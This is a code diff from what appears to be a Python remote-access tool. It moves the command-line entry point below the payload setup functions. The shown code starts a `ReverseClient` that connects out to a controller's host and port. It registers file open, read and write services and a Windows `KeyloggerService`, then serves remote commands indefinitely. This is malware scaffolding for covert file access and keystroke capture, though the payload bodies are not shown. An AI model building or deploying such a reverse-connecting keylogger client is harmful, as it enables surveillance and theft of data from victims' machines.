@@ -81,32 +81,6 @@ class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
     pass
 
 
-if __name__ == '__main__':
-    import argparse
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument('host',
-            help='the host name or ip address to connect to. '
-                 '[default: localhost]',
-            default='localhost',
-            nargs='?',
-    )
-    parser.add_argument('--port', '-p',
-            help='the port number to connect to. '
-                 '[default: 8000]',
-            default=8000,
-    )
-    args = parser.parse_args()
-    host, port = addr = args.host, args.port
-
-    with ReverseClient(addr) as client:
-        init_payload(client)
-        try:
-            client.serve_forever()
-        except connection.ConnectionClosed:
-            pass
-
-
 def init_payload(client):
     # TODO: for f in payload.__all__ ...
     funcs = [
@@ -134,4 +108,30 @@ def init_windows_payload(client):
     for f in funcs:
         client.register_function(f)
     client.register_instance(payload.windows.KeyloggerService())
+
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('host',
+            help='the host name or ip address to connect to. '
+                 '[default: localhost]',
+            default='localhost',
+            nargs='?',
+    )
+    parser.add_argument('--port', '-p',
+            help='the port number to connect to. '
+                 '[default: 8000]',
+            default=8000,
+    )
+    args = parser.parse_args()
+    host, port = addr = args.host, args.port
+
+    with ReverseClient(addr) as client:
+        init_payload(client)
+        try:
+            client.serve_forever()
+        except connection.ConnectionClosed:
+            pass
 
